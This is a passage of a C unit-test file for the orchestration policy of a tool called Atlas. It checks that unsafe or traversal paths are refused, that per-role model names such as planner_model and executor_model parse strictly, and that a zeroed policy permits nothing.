        T_CHECK_MSG(p.reason == ATLAS_ORCHPOLICY_REASON_ABSENT,
                    "a missing policy under a root-owned directory reported %s",
                    atlas_orchpolicy_reason_name(p.reason));
    }
    /* An absent policy under a directory this uid owns is refused *before* its
     * absence matters, and that ordering is deliberate: the question "may this
     * path be trusted?" is answered first, so creating the file later cannot
     * change the answer. The reason is about the path, not about the file. */
    {
        char gone[4096];
        (void)snprintf(gone, sizeof(gone), "%s/absent.conf", fx_data_dir(&fx));
        atlas_orchpolicy p;
        atlas_orchpolicy_load_at(gone, &p);
        T_CHECK(p.state == ATLAS_ORCHPOLICY_DISABLED);
        T_CHECK_MSG(p.reason == ATLAS_ORCHPOLICY_REASON_WRITABLE ||
                        p.reason == ATLAS_ORCHPOLICY_REASON_PATH_UNSAFE,
                    "a policy path this uid controls reported %s rather than an unsafe path",
                    atlas_orchpolicy_reason_name(p.reason));
    }
    /* A relative path, and a path with a traversal component, are refused as
     * paths rather than opened. */
    for (const char *bad = NULL;;) {
        static const char *const BADPATHS[] = {"orchestration.conf", "/etc/../etc/atlas/x.conf",
                                               "", "/"};
        for (size_t i = 0; i < sizeof BADPATHS / sizeof BADPATHS[0]; i++) {
            atlas_orchpolicy p;
            atlas_orchpolicy_load_at(BADPATHS[i], &p);
            T_CHECK_MSG(p.state == ATLAS_ORCHPOLICY_DISABLED, "\"%s\" enabled orchestration",
                        BADPATHS[i]);
        }
        (void)bad;
        break;
    }

    fx_close(&fx);
}

/* --- A12.0: the model each role runs under ----------------------------------
 *
 * The key rules — one occurrence, a checked token, absent means unset — are
 * asked of the parser directly, through `src/orch/policy_internal.h`.
 *
 * `atlas_orchpolicy_load_at` cannot reach them from here and that is not a gap
 * in the test: this process is not root, so the path walk refuses every file it
 * can create before a byte is parsed, which is exactly the property the case
 * above proves. The parse seam is internal, sets no state, and enables nothing;
 * only the loader may do that, and only after the file's provenance is
 * established.
 */
#define POLICY_BASE                                                             \
    "dispatcher_uid = 993\nsubmitter_uid = 1000\nrepo = proj\nmode = patch\n"    \
    "driver = fake\nworker_root = /var/lib/atlas-worker\n"

static atlas_orchpolicy_reason parse_policy(const char *text, atlas_orchpolicy *out) {
    memset(out, 0, sizeof(*out));
    return atlas_orchpolicy_parse_bytes(text, strlen(text), out);
}

static void test_a_policy_may_name_one_model_per_role(void) {
    atlas_orchpolicy p;

    /* Absent is the ordinary state: a policy written before this season parses
     * exactly as it did, and both names read empty — which is "whatever the
     * worker's own session defaults to", the behaviour that shipped. */
    T_CHECK(parse_policy(POLICY_BASE, &p) == ATLAS_ORCHPOLICY_REASON_ACTIVE);
    T_CHECK_MSG(p.planner_model[0] == '\0', "an absent planner_model parsed as \"%s\"",
                p.planner_model);
    T_CHECK_MSG(p.executor_model[0] == '\0', "an absent executor_model parsed as \"%s\"",
                p.executor_model);
    /* The parser never enables anything. The one `ENABLED` assignment is the
     * loader's last statement, after the root-owned path walk. */
    T_CHECK_MSG(p.state == ATLAS_ORCHPOLICY_DISABLED, "the parser enabled orchestration by itself");

    T_CHECK(parse_policy(POLICY_BASE "planner_model = fable\nexecutor_model = opus-4-5\n", &p) ==
            ATLAS_ORCHPOLICY_REASON_ACTIVE);
    T_CHECK(strcmp(p.planner_model, "fable") == 0);
    T_CHECK(strcmp(p.executor_model, "opus-4-5") == 0);

    /* Each is independent of the other: naming one leaves the other unset
     * rather than making the policy incomplete. */
    T_CHECK(parse_policy(POLICY_BASE "planner_model = fable\n", &p) ==
            ATLAS_ORCHPOLICY_REASON_ACTIVE);
    T_CHECK(strcmp(p.planner_model, "fable") == 0);
    T_CHECK(p.executor_model[0] == '\0');
    T_CHECK(parse_policy(POLICY_BASE "executor_model = claude-opus-4-5-20251101\n", &p) ==
            ATLAS_ORCHPOLICY_REASON_ACTIVE);
    T_CHECK(strcmp(p.executor_model, "claude-opus-4-5-20251101") == 0);
    T_CHECK(p.planner_model[0] == '\0');

    /* The longest accepted name, exactly at the bound. */
    char body[512];
    char name[65];
    memset(name, 'a', 64);
    name[64] = '\0';
    (void)snprintf(body, sizeof body, "%splanner_model = %s\n", POLICY_BASE, name);
    T_CHECK_MSG(parse_policy(body, &p) == ATLAS_ORCHPOLICY_REASON_ACTIVE,
                "a 64-character model name was refused");
    T_CHECK(strcmp(p.planner_model, name) == 0);
}

static void test_a_model_name_atlas_half_understands_is_malformed(void) {
    char over[512];
    char toolong[66];
    memset(toolong, 'a', 65);
    toolong[65] = '\0';
    (void)snprintf(over, sizeof over, "%splanner_model = %s\n", POLICY_BASE, toolong);

    const char *const BAD[] = {
        /* Twice is not once. Which of the two Atlas would use is a question a
         * policy must never leave open — `dispatcher_uid`'s rule. */
        POLICY_BASE "planner_model = fable\nplanner_model = opus\n",
        POLICY_BASE "executor_model = fable\nexecutor_model = opus\n",
        POLICY_BASE "planner_model = fable\nplanner_model = fable\n",
        /* Outside the token shape a specification could legally carry. */
        POLICY_BASE "planner_model = Opus\n",
        POLICY_BASE "planner_model = opus 4\n",
        POLICY_BASE "planner_model = ../opus\n",
        POLICY_BASE "planner_model = opus/4\n",
        POLICY_BASE "executor_model = opus\t4\n",
        /* No value at all is not "unset"; it is a line whose author meant
         * something Atlas cannot read. */
        POLICY_BASE "planner_model =\n",
        POLICY_BASE "planner_model = \n",
        /* And a neighbouring key Atlas does not know is still an error. */
        POLICY_BASE "planner_models = opus\n",
        POLICY_BASE "model = opus\n",
        POLICY_BASE "planner = opus\n",
        over,
    };
    for (size_t i = 0; i < sizeof BAD / sizeof BAD[0]; i++) {
        atlas_orchpolicy p;
        T_CHECK_MSG(parse_policy(BAD[i], &p) == ATLAS_ORCHPOLICY_REASON_MALFORMED,
                    "shape %zu was not refused", i);
        T_CHECK_MSG(p.state == ATLAS_ORCHPOLICY_DISABLED, "shape %zu enabled orchestration", i);
    }
}

static void test_a_zeroed_policy_permits_nothing(void) {
    atlas_orchpolicy p;
    memset(&p, 0, sizeof(p));
    T_CHECK(p.state == ATLAS_ORCHPOLICY_DISABLED);
    T_CHECK(!atlas_orchpolicy_is_dispatcher(&p, 0));
    T_CHECK(!atlas_orchpolicy_is_dispatcher(&p, 993));
    T_CHECK(!atlas_orchpolicy_permits_submitter(&p, 1000));
    T_CHECK(!atlas_orchpolicy_permits_repo(&p, ""));
    T_CHECK(!atlas_orchpolicy_permits_mode(&p, "patch"));
    T_CHECK(!atlas_orchpolicy_permits_driver(&p, "fake"));
    T_CHECK(!atlas_orchpolicy_permits_repo(&p, NULL));

    /* And nothing can be submitted under it: applying its limits refuses. */
    atlas_orch_spec s;
    fill_spec(&s);
    atlas_err err;
    atlas_err_init(&err);
    T_CHECK(atlas_orchpolicy_apply_limits(&p, &s, &err) != ATLAS_OK);
    atlas_orch_spec_free(&s);
    T_CHECK(atlas_orchpolicy_apply_limits(NULL, &s, &err) != ATLAS_OK);
}

static const atlas_test TESTS[] = {
    {"UNKNOWN is the zero state everywhere", test_unknown_is_the_zero_state},
    {"every state name round-trips", test_every_state_name_round_trips},
    {"every vocabulary member names itself", test_every_vocabulary_member_names_itself},
    {"every transition matches the enumerated table",
     test_every_transition_matches_the_enumerated_table},
    {"terminal states never return", test_terminal_states_never_return},
    {"no traversal or escape survives a declared path",
     test_no_traversal_or_escape_survives_a_declared_path},
    {"netstring lists round-trip and reject rubbish",
     test_netstring_lists_round_trip_and_reject_rubbish},
    {"validation argv refuses what would reach a child differently",
     test_validation_argv_refuses_what_would_reach_a_child_differently},
    {"the digest is stable and covers what it claims",
     test_the_digest_is_stable_and_covers_what_it_claims},
    {"the digest is length-prefixed, not delimited",
     test_the_digest_is_length_prefixed_not_delimited},
    {"a declared path set is order independent", test_a_declared_path_set_is_order_independent},
    {"validation refuses every unbounded or unresolved field",
     test_validation_refuses_every_unbounded_or_unresolved_field},
    {"identifiers and tokens are unique and well formed",
     test_identifiers_and_tokens_are_unique_and_well_formed},
    {"no unprivileged shape enables orchestration",
     test_no_unprivileged_shape_enables_orchestration},
    {"a zeroed policy permits nothing", test_a_zeroed_policy_permits_nothing},
    {"a policy may name one model per role", test_a_policy_may_name_one_model_per_role},
    {"a model name Atlas half understands is malformed",
     test_a_model_name_atlas_half_understands_is_malformed},
};

ATLAS_TEST_MAIN("orch_model", TESTS)
